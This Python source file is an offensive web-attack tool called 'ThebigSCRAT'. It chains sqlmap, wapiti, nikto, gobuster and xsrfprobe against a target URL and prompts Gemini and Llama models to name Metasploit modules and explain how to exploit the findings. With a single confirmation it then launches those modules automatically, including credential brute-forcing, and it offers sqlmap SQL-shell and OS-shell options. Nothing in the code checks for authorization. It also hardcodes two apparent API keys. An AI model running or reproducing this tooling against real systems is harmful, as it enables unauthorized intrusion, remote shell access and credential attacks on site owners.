import subprocess
from urllib.parse import urlparse
import tempfile
import sys
import os
import time
import requests
from requests.exceptions import RequestException
import json
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from pathlib import Path
import google.generativeai as genai
from together import Together
from pymetasploit3.msfrpc import MsfRpcClient #pip install pymetasploit3
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter, landscape
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph
from reportlab.lib.styles import getSampleStyleSheet


# Check if user got install sqlmap and other tools
def check_tools_installed():
    tools = {
        'sqlmap': 'sqlmap is not installed!\n\nInstall it before running this tool.',
        'wapiti': 'Wapiti is not installed!\n\nInstall it before running this tool.',
        'xsrfprobe': 'XSRFProbe is not installed!\n\nInstall it before running this tool.',
        'nikto': 'Nikto is not installed!\n\nInstall it before running this tool.',
        'gobuster': 'Gobuster is not installed!\n\nInstall it before running this tool.',
        'msfconsole': 'Msfconsole is not installed!\n\nInstall it before running this tool. (sudo snap install metasploit-framework)'
    }

    for tool, error_message in tools.items():
        tool_exist = subprocess.run(['which', tool], capture_output=True, text=True)
        if tool_exist.returncode != 0:
            print(f"\nERROR: {error_message}")
            sys.exit(0)

def prompt_user_for_choice():
    print("\nSelect an option\n")
    print("1)\tInformation Gathering")
    print("2)\tProbing and Preliminary Form testing for SQLi")
    print("3)\tScan for XSS")
    print("4)\tAI-Assisted Nikto Vulnerability Scan with metasploit(experimental)") 
    print("5)\tAI Webpage Analysis (HTML & Headers) with metasploit(experimental)") 
    print("6)\tBrute-force directories with Gobuster")  # New Option for Gobuster
    print("7)\tScan for CSRF")
    print("8)\tScan HTML files with Together AI")
    print("=========================Testing with Parameters included=========================")
    print("9)\tAttempt to open a SQL Shell")
    print("10)\tAttempt to open an OS Shell")
    print(" ThebigSCRAT > ", end="")
    
    choice = input().strip()
    return choice

def download_resource(url, output_directory):
    """
    Download a resource (CSS, JS, image) and save it to the specified output directory.
    """
    try:
        # Send a GET request to the resource URL
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            # Get the resource's file name from the URL
            parsed_url = urlparse(url)
            resource_name = os.path.basename(parsed_url.path)
            # Determine the output path
            output_path = os.path.join(output_directory, resource_name)
            # Create the directory if it doesn't exist
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
            # Write the content to a file
            with open(output_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            print(f"Downloaded {url} to {output_path}")
        else:
            print(f"Failed to download {url}: HTTP Status Code {response.status_code}")
    except Exception as e:
        print(f"Error downloading {url}: {e}")

def download_website(url, output_directory):
    """
    Download the HTML content of the website and its related resources.
    """
    try:
        # Send a GET request to the website's main page
        response = requests.get(url)
        if response.status_code != 200:
            print(f"Failed to retrieve website. HTTP Status Code: {response.status_code}")
            return

        # Parse the HTML content with BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')

        # Save the main HTML file
        parsed_url = urlparse(url)
        website_name = parsed_url.netloc.replace('.', '_')
        html_output_path = os.path.join(output_directory, f"{website_name}.html")
        with open(html_output_path, 'w', encoding='utf-8') as f:
            f.write(soup.prettify())
        print(f"Saved HTML to {html_output_path}")

        # Find and download all CSS, JS, and image resources
        resources = []

        # Download CSS files
        for css in soup.find_all('link', rel='stylesheet'):
            css_url = urljoin(url, css['href'])
            resources.append(css_url)

        # Download JavaScript files
        for js in soup.find_all('script', src=True):
            js_url = urljoin(url, js['src'])
            resources.append(js_url)

        # Download images
        for img in soup.find_all('img', src=True):
            img_url = urljoin(url, img['src'])
            resources.append(img_url)

        # Download all resources
        for resource_url in resources:
            download_resource(resource_url, output_directory)

    except Exception as e:
        print(f"Error downloading website: {e}")

def AutoSql_Execution(choice, url):
    if choice == '1':
        # Directory to save the downloaded content
        output_dir = "downloaded_website"
        # Create the output directory if it doesn't exist
        Path(output_dir).mkdir(parents=True, exist_ok=True)

        # Download the website structure and resources
        download_website(url, output_dir)
        result = subprocess.run(['sqlmap', '-u', url, '--fingerprint', '--random-agent', '--level' , '1', '--risk', '1', '--threads' ,'1', '-b', '--dbs', '--tables', '--eta', '--cleanup', '--exclude-sysdbs', '--crawl=2'])
        
    elif choice == "2":
        result = subprocess.run(['sqlmap' , '-u', url, '--forms', '--batch', '--random-agent', '--level=3', '--risk=2', '--threads=10'])
    
    elif choice == "3":
        result = subprocess.run(['wapiti','-u',url, '-m', 'xss', '--flush-attacks', '--flush-session'])

    elif choice == "4":
        # Run Nikto scan
        run_nikto_scan(url)

    elif choice == "5":
        scan_html_with_AI(url)

    elif choice == "6":
        run_gobuster(url)  # Call Gobuster function

    elif choice == "7":
        # Scan for CSRF
        result = subprocess.run(['xsrfprobe', '-u', url, '--crawl', '--display', '-v'])
    elif choice == "8":
        # Scan HTML using together
        scan_html_files_with_together()
        
    elif choice == "9":
        result = subprocess.run(['sqlmap' , '-u', url,  '--random-agent', '--level=3' , '--risk=2' , '--threads=5', '-b' ,'--sql-shell', '--eta', '--cleanup', '--exclude-sysdbs'])

    elif choice == "10":
        result = subprocess.run(['sqlmap', '-u', url, '--random-agent', '--level=3', '--risk=2', '--threads=5' , '-b' , '--os-shell', '--eta', '--cleanup',  '--exclude-sysdbs'])

def run_nikto_scan(url):
    """Runs Nikto scan and captures output as a string."""
    print("\nRunning Nikto scan...\n")
    
    # Run Nikto and capture output
    result = subprocess.run(
        ['nikto', '-h', url, '-Tuning', '2,4,8,9'],
        capture_output=True, text=True
    )
    
    nikto_output = result.stdout  # Get the command output
    response = analyze_nikto_with_gemini(nikto_output,"AIzaSyCM6-SGCbqKJEdkQwxNfw8EBI6lehynnuY", url)
    return response

def scan_html_with_AI(url):
   
    try:
        # Set a user agent to avoid being blocked by some websites
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # Send GET request to the URL
        html = requests.get(url, headers=headers, timeout=30)
        
        # Raise an exception for bad status codes
        html.raise_for_status()
        # Return the webpage content
        if headers is None or html is None:
            return "Error: Missing headers or HTML content"
        
        # Convert headers to string representation
        if isinstance(html.headers, str):
            headers_str = html.headers
        else:
            headers_str = str(dict(html.headers))
        
        # Combine headers and HTML
        content = f"{headers_str}\n{html.text}"
        print(content)
        response = analyze_webpage(content,"AIzaSyCM6-SGCbqKJEdkQwxNfw8EBI6lehynnuY", url)
        return response
    
    except RequestException as e:
        return f"Error downloading webpage: {str(e)}"
    except Exception as e:
        return f"Unexpected error: {str(e)}"


def analyze_webpage(webpage, api_key, url):
    """
    Analyzing webpage using Google's Gemini AI API.
    """
    try:
        # Configure the Gemini API
        genai.configure(api_key=api_key)
        
        # Initialize Gemini model
        model = genai.GenerativeModel(model_name="gemini-2.0-flash-lite-preview-02-05")
        
        # Prepare the prompt
        prompt = f"""
        Please check the following webpage for vulnerabilities and output them in a simplified format in one JSON response. For each vulnerability, include the description, the corresponding Metasploit attack module (if applicable), and remediation steps. Format each vulnerability with the following structure JSON:

        {{
            "Vulnerability": "Vulnerability name",
            "Description": "brief summary of the vulnerability",
            "Vulnerability Severity": "High/Medium/Low",
            "Metasploit Attack Module Path": "path of module",
            "Attack description": "description of how to attack",
            "Remediation": "How to fix"
        }}

        Scan Results:
        {webpage}
        """

        # Generate response from Gemini
        response = model.generate_content(prompt)
        json_string = response.text.strip("```json").strip("```").strip()
        
        try: 
            data = json.loads(json_string)
            print(data)
            choice = input("\nDo you want to attempt to exploit these vulnerabilities using Metasploit (experimental feature)? (y/n): ").strip().lower()
            if choice in ('y', 'yes'):
                # Iterate through vulnerabilities and trigger the relevant Metasploit attack
                for vulnerability in data:
                    if vulnerability['Metasploit Attack Module Path'] and not any(x in vulnerability['Metasploit Attack Module Path'].lower() for x in ["none", "null", "n/a"]):
                        print(f"Attempting to execute Metasploit attack module: {vulnerability['Metasploit Attack Module Path']}")
                    
                        # Run the Metasploit module using the RC file approach
                        attack_result = run_metasploit_attack(vulnerability['Metasploit Attack Module Path'], url)
                        
                        # Add results to our output
                        vulnerability["Attack Result"] = attack_result
                    else:
                        vulnerability["Attack Result"] = "NIL"
                return generate_vulnerability_report(data)
            else:
                return generate_vulnerability_report(data)

        except json.JSONDecodeError as e:
            print("Error parsing JSON, try again.")
            return f"Error parsing JSON: {str(e)}"
    except Exception as e:
        print("Error parsing JSON, try again.")
        return f"Error analyzing results: {str(e)}"

def analyze_nikto_with_gemini(nikto_output, api_key, url):
    """
    Analyzing Nikto scan results using Google's Gemini AI API.
    """
    try:
        # Configure the Gemini API
        genai.configure(api_key=api_key)
        
        # Initialize Gemini model
        model = genai.GenerativeModel(model_name="gemini-2.0-flash-lite-preview-02-05")
        
        # Prepare the prompt
        prompt = f"""
        Please process the following vulnerabilities from a Nikto scan and output them in a simplified format. For each vulnerability, include the description, the corresponding Metasploit attack module (if applicable), and remediation steps. Format each vulnerability with the following structure in JSON:

        {{
            "Vulnerability": "Vulnerability name",
            "Description": "brief summary of the vulnerability",
            "Vulnerability Severity": "High/Medium/Low",
            "Metasploit Attack Module Path": "path of module",
            "Attack description": "description of how to attack",
            "Remediation": "How to fix"
        }}

        Scan Results:
        {nikto_output}
        """
        print(nikto_output)
        # Generate response from Gemini
        response = model.generate_content(prompt)
        json_string = response.text.strip("```json").strip("```").strip()
        print(response.text)
        try: 
            data = json.loads(json_string)
            choice = input("\nDo you want to attempt to exploit these vulnerabilities using Metasploit (experimental feature)? (y/n): ").strip().lower()
            if choice in ('y', 'yes'):
                # Iterate through vulnerabilities and trigger the relevant Metasploit attack
                for vulnerability in data:
                    if vulnerability['Metasploit Attack Module Path'] and not any(x in vulnerability['Metasploit Attack Module Path'].lower() for x in ["none", "null", "n/a"]):
                        print(f"Attempting to execute Metasploit attack module: {vulnerability['Metasploit Attack Module Path']}")
                    
                        # Run the Metasploit module using the RC file approach
                        attack_result = run_metasploit_attack(vulnerability['Metasploit Attack Module Path'], url)
                        
                        # Add results to our output
                        vulnerability["Attack Result"] = attack_result
                    else:
                        vulnerability["Attack Result"] = "NIL"
                return generate_vulnerability_report(data)
            else:
                return generate_vulnerability_report(data)

        except json.JSONDecodeError as e:
            print("Error parsing JSON, try again.")
            return f"Error parsing JSON: {str(e)}"
    except Exception as e:
        print("Error parsing JSON, try again.")
        return f"Error analyzing results: {str(e)}"
    

def run_metasploit_attack(module_path, url):
   """Execute a Metasploit module via RC script parsing parameters from URL"""

   try:
       # First verify if the module exists
       check_cmd = ["msfconsole", "-q", "-x", f"use {module_path}; exit"]
       check_result = subprocess.run(check_cmd, capture_output=True, text=True)
        
       # Check if the output indicates the module doesn't exist
       if "No such module" in check_result.stdout or "Failed to load module" in check_result.stdout:
            return f"Unable to verify. Attack Module '{module_path}' does not exist in Metasploit."
       
       # Parse URL to get components
       parsed_url = urlparse(url)
       
       # Determine if SSL is used
       ssl = parsed_url.scheme == 'https'
       
       # Extract host
       target_host = parsed_url.netloc
       if ':' in target_host:
           target_host, port = target_host.split(':')
           target_port = int(port)
       else:
           # Default ports based on scheme
           target_port = 443 if ssl else 80
       
       print(f"Preparing to run Metasploit module: {module_path} against {target_host}:{target_port}")
       
       # Create a temporary RC file
       fd, rc_file = tempfile.mkstemp(suffix='.rc')
       with os.fdopen(fd, 'w') as f:
           f.write(f"use {module_path}\n")
           f.write(f"set RHOSTS {target_host}\n")
           f.write(f"set RPORT {target_port}\n")
           
           # Set SSL option if needed
           if ssl:
               f.write("set SSL true\n")
           
           # Check if module requires wordlist and set it
           if "bruteforce" in module_path or "auxiliary/scanner/http" in module_path:
               f.write("set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_userpass.txt\n")
           elif "password" in module_path or "login" in module_path:
               f.write("set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt\n")
               f.write("set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt\n")
           
           f.write("run\n")
           f.write("exit\n")
       
       print(f"Created temporary RC file: {rc_file}")
       
       # Run Metasploit with the RC file
       print("Launching msfconsole...")
       cmd = ["msfconsole", "-q", "-r", rc_file]
       result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
       
       # Clean up
       os.unlink(rc_file)
       
       return result.stdout
   except subprocess.TimeoutExpired:
        # Clean up if timeout occurs
        try:
            os.unlink(rc_file)
        except:
            pass
        return "Error: Metasploit execution timed out after 30 seconds"


def generate_vulnerability_report(json_data, pdf_filename="Vulnerability_Report.pdf"):
    """Generates a vulnerability report PDF from given JSON data."""
    
    # Define styles
    styles = getSampleStyleSheet()
    header_style = styles["Heading4"]

    # Define column headers (add S/N at the beginning)
    columns = ["S/N"] + list(json_data[0].keys())

    # Format headers using Paragraph for wrapping
    formatted_headers = [Paragraph(col, header_style) for col in columns]

    # Convert JSON data to table format
    table_data = [formatted_headers]  # Table headers
    for index, entry in enumerate(json_data, start=1):
        row = [str(index)]  # Add S/N number
        for col in columns[1:]:  # Skip S/N column when iterating over JSON keys
            text = str(entry[col]) if entry[col] is not None else "null"
            row.append(Paragraph(text, styles["Normal"]))  # Wrap text in paragraphs
        table_data.append(row)

    # Define column widths (adjusted for S/N column)
    col_widths = [30, 70, 150, 70, 70, 150, 150, 80]

    # Create table
    table = Table(table_data, colWidths=col_widths)

    # Apply table styles
    style = TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.darkgrey),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
        ('ALIGN', (0, 0), (-1, -1), 'LEFT'),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 10),
        ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
        ('GRID', (0, 0), (-1, -1), 1, colors.black),
    ])
    table.setStyle(style)

    # Define PDF file
    pdf = SimpleDocTemplate(pdf_filename, pagesize=landscape(letter))

    # Build PDF
    pdf.build([table])

    print(f"PDF generated: {pdf_filename}")



def run_gobuster(url):
    """
    Runs Gobuster to find hidden directories and files.
    """
    wordlist = "common.txt"  # Adjust based on availability
    output_file = "gobuster_results.txt"
    
    print(f"\nRunning Gobuster against {url}...\n")
    
    try:
        result = subprocess.run(
            ['gobuster', 'dir', '-u', url, '-w', wordlist, '-o', output_file, '-t', '50'],
            capture_output=True, text=True
        )
        print(result.stdout)
        print(f"\nGobuster scan completed. Results saved to {output_file}")
    except Exception as e:
        print(f"Error running Gobuster: {e}")
        
def scan_html_files_with_together(api_key="5ec01d4a669304d1ec582e9acf084b08c10148d880841fc390642da5a4c5e013", directory="downloaded_website"):
    """Scans HTML files in a specified directory for security vulnerabilities using Together AI."""
    together = Together(api_key=api_key)
    
    if not os.path.exists(directory):
        print(f"Error: Folder '{directory}' not found.")
        return

    html_files = [f for f in os.listdir(directory) if f.endswith(".html")]
    if not html_files:
        print("No HTML files found in the folder.")
        return
    
    print("\nAvailable HTML files:")
    for i, file in enumerate(html_files):
        print(f"{i + 1}. {file}")
    
    while True:
        try:
            choice = int(input("\nEnter the number of the HTML file to scan: ")) - 1
            if 0 <= choice < len(html_files):
                selected_file = os.path.join(directory, html_files[choice])
                selected_filename = os.path.splitext(html_files[choice])[0]
                break
            else:
                print("Invalid choice. Please enter a valid number.")
        except ValueError:
            print("Invalid input. Please enter a number.")
    
    with open(selected_file, "r", encoding="utf-8") as file:
        html_content = file.read()
    
    response = together.chat.completions.create(
        model="meta-llama/Meta-Llama-3.1-8B-Instruct-Turbo-128K",
        messages=[
            {"role": "system", "content": "You are a cybersecurity expert. Scan the following HTML file for security vulnerabilities, explain any vulnerabilities if present and how to exploit them."},
            {"role": "user", "content": html_content}
        ]
    )
    
    scan_results = response.choices[0].message.content
    output_file_path = f"{selected_filename}_scan.txt"
    with open(output_file_path, "w", encoding="utf-8") as file:
        file.write(scan_results)
    
    print(f"\nScan results saved to {output_file_path}")
    return output_file_path

def main():
    # Check if SQLMap, Wapiti, and Nikto are installed
    check_tools_installed()

    # URL Exception
    if len(sys.argv) <= 1:
        print("\nNo URL specified. Example: python ThebigSCRAT.py http://www.example.com/index.php?id=")
        sys.exit(0)

    url = sys.argv[1]
    while True:
        choice = prompt_user_for_choice()
        AutoSql_Execution(choice, url)
    

if __name__ == '__main__':
    main()
